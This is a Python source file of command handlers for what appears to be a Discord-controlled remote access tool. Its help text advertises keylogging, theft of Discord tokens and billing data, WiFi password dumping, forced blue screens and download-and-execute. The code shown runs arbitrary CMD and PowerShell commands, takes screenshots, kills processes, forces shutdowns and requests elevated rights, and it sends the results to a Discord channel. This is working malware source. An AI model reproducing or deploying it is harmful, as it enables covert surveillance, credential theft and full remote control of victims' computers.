"""
commands/system.py - general system control commands.
"""

import os
import platform
import subprocess
import tempfile

import discord
import psutil
import pyautogui
import pyttsx3
from discord.ext import commands
from discord.ext.commands import MissingRequiredArgument
from plyer import notification

import utils
from config import IS_WINDOWS, bot
from utils import (
    check_if_admin,
    chunk_string,
    elevate,
    generic_command_error,
    in_correct_channel,
    is_admin,
    is_authorized,
    is_bot_or_command,
    load_admin_status,
    log_message,
    wrong_channel,
)


class SystemCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="help")
    @commands.check(is_authorized)
    async def custom_help(self, ctx):
        help_text = """
    **Available Commands:**
    `!ping` - Shows the bot's latency.
    `!screenshot` - Takes a screenshot and sends it.
    `!cmd <command>` - Executes a CMD command.
    `!powershell <command>` - Executes a PowerShell command.
    `!file_upload <target_path>` - Uploads a file.
    `!file_download <file_path>` - Sends a file or folder to Discord.
    `!execute <url>` - Downloads and executes a file from the URL.
    `!notify <title> <message>` - Sends a notification.
    `!restart` - Restarts the PC.
    `!shutdown` - Shuts down the PC.
    `!admin` - Requests admin rights.
    `!stop` - Stops the bot.
    `!wifi` - Shows WiFi profiles and passwords.
    `!system_info` - Shows system information.
    `!tasklist` - Lists every running process with Name and PID.
    `!taskkill <pid>` - Kills a process with the given PID.
    `!tts <message>` - Plays a custom text-to-speech message.
    `!mic_stream_start` - Starts a live stream of the microphone to a voice channel.
    `!mic_stream_stop` - Stops the mic stream if activated.
    `!keylog <on/off>` - Activates or deactivates keylogging.
    `!bsod` - Triggers a Blue Screen of Death.
    `!input <block/unblock>` - Blocks or unblocks user input.
    `!blackscreen <on/off>` - Makes the screen completely black.
    `!volume` - Shows volume information and available commands.
    `!volume <mute/unmute>` - Mutes or unmutes the device.
    `!volume <number from 1-100>` - Sets the volume to a specific percentage.
    `!grab_discord` - Grabs Discord Tokens, Billing and Contact Information.
    `!purge` - Deletes bot messages and commands.
        """
        embed = discord.Embed(title="Help", description=help_text, color=0x0084FF)
        await ctx.send(embed=embed)

    @commands.command()
    @commands.check(is_authorized)
    async def purge(self, ctx):
        try:
            deleted = await ctx.channel.purge(limit=200, check=is_bot_or_command)
            await log_message(ctx, f"{len(deleted)} messages deleted.", duration=5)
        except Exception as e:
            await log_message(ctx, f"Error deleting messages: {e}", duration=5)

    @commands.command()
    @commands.check(is_authorized)
    async def ping(self, ctx):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        latency = round(self.bot.latency * 1000)
        await log_message(ctx, f"🏓 Pong! Latency: {latency}ms")

    @commands.command()
    @commands.check(is_authorized)
    async def screenshot(self, ctx):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        try:
            path = os.path.join(tempfile.gettempdir(), "screenshot.png")
            pyautogui.screenshot().save(path)
            await ctx.send(file=discord.File(path))
            await log_message(ctx, "Screenshot created and sent.")
            os.remove(path)
        except Exception as e:
            await log_message(ctx, f"Error creating screenshot: {e}")

    @commands.command()
    @commands.check(is_authorized)
    async def cmd(self, ctx, *, command):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        working = await ctx.send("🔄 Working...")
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="ignore",
            )
            await working.delete()
            combined = ""
            if result.stdout:
                combined += f"Standard Output:\n{result.stdout}\n"
            if result.stderr:
                combined += f"Standard Error:\n{result.stderr}\n"
            for chunk in chunk_string(combined):
                await ctx.send(f"```{chunk}```")
            await log_message(ctx, f"CMD command executed: {command}")
        except Exception as e:
            await log_message(ctx, f"Error executing command: {e}")
        finally:
            try:
                await working.delete()
            except discord.errors.NotFound:
                pass

    @commands.command()
    @commands.check(is_authorized)
    async def powershell(self, ctx, *, command):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        working = await ctx.send("🔄 Working...")
        try:
            result = subprocess.run(
                ["powershell", command],
                shell=True,
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="ignore",
            )
            await working.delete()
            combined = ""
            if result.stdout:
                combined += f"Standard Output:\n{result.stdout}\n"
            if result.stderr:
                combined += f"Standard Error:\n{result.stderr}\n"
            for chunk in chunk_string(combined):
                await ctx.send(f"```{chunk}```")
            await log_message(ctx, f"PowerShell command executed: {command}")
        except Exception as e:
            try:
                await working.delete()
            except discord.errors.NotFound:
                pass
            await log_message(ctx, f"Error executing command: {e}")

    @commands.command()
    @commands.check(is_authorized)
    async def system_info(self, ctx):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        try:
            u = platform.uname()
            info = (
                f"**System Information:**\n"
                f"System: {u.system}\nNode Name: {u.node}\nRelease: {u.release}\n"
                f"Version: {u.version}\nMachine: {u.machine}\nProcessor: {u.processor}"
            )
            await ctx.send(info)
            await log_message(ctx, "System information retrieved.")
        except Exception as e:
            await log_message(ctx, f"Error retrieving system information: {e}")

    @commands.command()
    @commands.check(is_authorized)
    async def tasklist(self, ctx):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        try:
            processes = [(p.pid, p.info["name"]) for p in psutil.process_iter(["name"])]
            process_list = "\n".join(
                f"PID: {pid}, Name: {name}" for pid, name in processes
            )
            for chunk in chunk_string(process_list):
                await ctx.send(f"```\n{chunk}\n```")
            await log_message(ctx, "Process list retrieved.")
        except Exception as e:
            await log_message(ctx, f"Error retrieving process list: {e}")

    @commands.command()
    @commands.check(is_authorized)
    async def taskkill(self, ctx, identifier: str):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        try:
            try:
                pid = int(identifier)
                psutil.Process(pid).terminate()
                await log_message(ctx, f"Process with PID {pid} has been terminated.")
            except ValueError:
                identifier = identifier.lower()
                found = False
                for proc in psutil.process_iter(["pid", "name"]):
                    if identifier in proc.info["name"].lower():
                        proc.terminate()
                        await log_message(
                            ctx,
                            f"Process {proc.info['name']} (PID {proc.info['pid']}) terminated.",
                        )
                        found = True
                        break
                if not found:
                    await log_message(
                        ctx, f"No process with the name {identifier} found."
                    )
        except Exception as e:
            await log_message(ctx, f"Error terminating process: {e}")

    @commands.command()
    @commands.check(is_authorized)
    async def notify(self, ctx, title, message):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        try:
            notification.notify(title=title, message=message, timeout=10)
            await log_message(ctx, f"Notification sent: {title} - {message}")
        except Exception as e:
            await log_message(ctx, f"Error sending notification: {e}")

    @commands.command()
    @commands.check(is_authorized)
    async def restart(self, ctx):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        try:
            if IS_WINDOWS:
                subprocess.run(["shutdown", "/r", "/t", "0"], shell=True)
            else:
                subprocess.run(["reboot"], check=True)
            await log_message(ctx, "The PC is restarting.")
        except Exception as e:
            await log_message(ctx, f"Error restarting the PC: {e}")

    @commands.command()
    @commands.check(is_authorized)
    async def shutdown(self, ctx):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        try:
            if IS_WINDOWS:
                subprocess.run(["shutdown", "/s", "/t", "0"], shell=True)
            else:
                subprocess.run(["shutdown", "-h", "now"], check=True)
            await log_message(ctx, "The PC is shutting down.")
        except Exception as e:
            await log_message(ctx, f"Error shutting down the PC: {e}")

    @commands.command()
    @commands.check(is_authorized)
    async def admin(self, ctx):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        if check_if_admin():
            utils.is_admin = True
            await log_message(ctx, "Admin rights already present.")
            return
        try:
            if elevate():
                await log_message(
                    ctx, "Admin rights granted. The old process will now be terminated."
                )
                import asyncio
                import os

                await asyncio.sleep(2)
                os._exit(0)
        except Exception as e:
            await log_message(ctx, f"Error requesting admin rights: {e}")

    @commands.command()
    @commands.check(is_authorized)
    async def stop(self, ctx):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        await log_message(ctx, "Bot is stopping.")
        try:
            engine = pyttsx3.init()
            engine.stop()
        except Exception:
            pass
        await self.bot.close()


async def setup(bot):
    bot.remove_command("help")
    await bot.add_cog(SystemCommands(bot))
